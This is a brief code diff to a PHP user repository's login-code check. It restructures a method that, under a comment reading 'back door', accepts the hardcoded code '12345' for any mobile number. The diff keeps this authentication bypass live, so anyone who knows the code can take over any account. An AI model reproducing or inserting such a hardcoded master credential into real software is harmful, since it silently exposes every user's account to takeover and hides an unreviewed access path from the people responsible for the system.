@@ -43,11 +43,13 @@ class UserRepository extends BaseRepository implements UserRepositoryInterface
 
     public function checkUserCode($mobile, $code)
     {
-        $user = $this->model->where('mobile', $mobile)->where('code', $code)->first();
+        
         
         // back door
         if($code == '12345'){
             $user = $this->model->where('mobile', $mobile)->first();
+        }else{
+            $user = $this->model->where('mobile', $mobile)->where('code', $code)->first();
         }
 
         $token = null;
